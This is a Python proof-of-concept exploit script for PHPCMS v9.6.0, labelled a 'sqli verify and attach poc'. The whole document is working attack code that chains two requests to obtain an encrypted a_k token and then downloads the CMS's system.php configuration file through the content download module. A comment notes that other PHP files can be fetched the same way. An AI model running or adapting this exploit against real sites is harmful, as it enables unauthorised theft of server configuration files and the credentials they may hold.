#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
phpcmsv9.6.0 sqli verify and attach poc
"""

import requests
import re
from urllib import quote

TIMEOUT = 3


def geta_k(url,payload):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/index.php')

    cookies = {}
    #print 'step1'
    step1 = '{}/index.php?m=wap&a=index&siteid=1'.format(url)
    #print 'step1',step1
    for c in requests.get(step1,timeout=TIMEOUT).cookies:
        if c.name[-7:] == '_siteid':
            cookie_head = c.name[:6]
            cookies[cookie_head + '_userid'] = c.value
            cookies[c.name] = c.value
            break
    else:
        return False
    
    step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&src={}".format(url, quote(payload))
    #print 'step2:',step2,cookies
    for c in requests.get(step2, cookies=cookies, timeout=TIMEOUT).cookies:
        if c.name[-9:] == '_att_json':
            enc_payload = c.value
            return enc_payload
            break
    else:
        return False



def download(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/index.php')

    # 以获取system.php配置文件为例，其他文件可以自行修改链接即可,只能下载cms的php文件
    payload = "&i=1&m=1&d=1&modelid=2&catid=6&s=caches/configs/system.ph&f=p%3%252%2*70C"
    a_k =  geta_k(url,payload)

    url3 = url+"/index.php?m=content&c=down&siteid=1&a=init&a_k="+a_k
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'}
    html = requests.get(url3,headers=headers)
    res = re.findall(r'<a href="(.*?)" class="xzs_btn"></a>',html.content)
    if res[0]:
        downfile = res[0]
    else:
        return False
    url4 = url+'/index.php'+downfile
    rep = requests.get(url4,headers=headers)
    print rep.content



if __name__ == '__main__':
    download('http://localhost/')